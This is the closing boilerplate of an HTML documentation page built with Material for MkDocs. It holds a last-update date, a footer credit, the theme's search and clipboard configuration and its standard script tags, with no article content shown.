  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="May 31, 2025 19:44:57 UTC">May 31, 2025</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
      
    
  </body>
</html>